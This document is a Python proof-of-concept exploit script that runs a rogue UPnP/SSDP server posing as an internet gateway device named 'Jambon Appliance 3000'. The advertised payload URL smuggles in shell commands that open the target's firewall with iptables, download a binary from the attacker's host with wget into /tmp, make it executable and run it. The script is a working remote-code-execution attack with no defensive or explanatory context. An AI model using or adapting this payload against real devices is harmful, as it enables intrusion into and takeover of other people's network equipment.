from lib.ssdp import SSDPServer
from lib.upnp_http_server import UPNPHTTPServer
from time import sleep
import uuid
import logging
import sys

logger = logging.getLogger()
logger.setLevel(logging.INFO)

device_uuid = uuid.uuid4()

attacker_ip_address = sys.argv[1]

if len(sys.argv) < 1:
    print("[>] python3 __main__.py \{ATTACKER_IP\}")
    print("[>] Example : python3 __main__.py 192.168.10.3")
    sys.exit()

payload = "/t;/sbin/iptables -I INPUT -p all -j ACCEPT;wget http://{}/es -q -O /tmp/es;chmod 777 /tmp/es;/tmp/es {}".format(attacker_ip_address,attacker_ip_address)

http_server = UPNPHTTPServer(7777,
                             friendly_name ="payload_server",
                             manufacturer  ="payload_server",
                             manufacturer_url="http://PoC.com",
                             model_description='Jambon Appliance 3000',
                             model_name="Jambon",
                             model_number="3000",
                             model_url="http://PoC.com",
                             serial_number="POC425133",
                             uuid=device_uuid,
                             presentation_url="http://{}:7777/".format(attacker_ip_address),
                             payload_url=payload)
http_server.start()

ssdp = SSDPServer()
ssdp.register('local',
              'uuid:{}::schemas-upnp-org:device:InternetGatewayDevice:1'.format(device_uuid),
              'urn:schemas-upnp-org:device:InternetGatewayDevice:1',                            
              'http://{}:7777/gatedesc.xml'.format(attacker_ip_address))
ssdp.run(attacker_ip_address)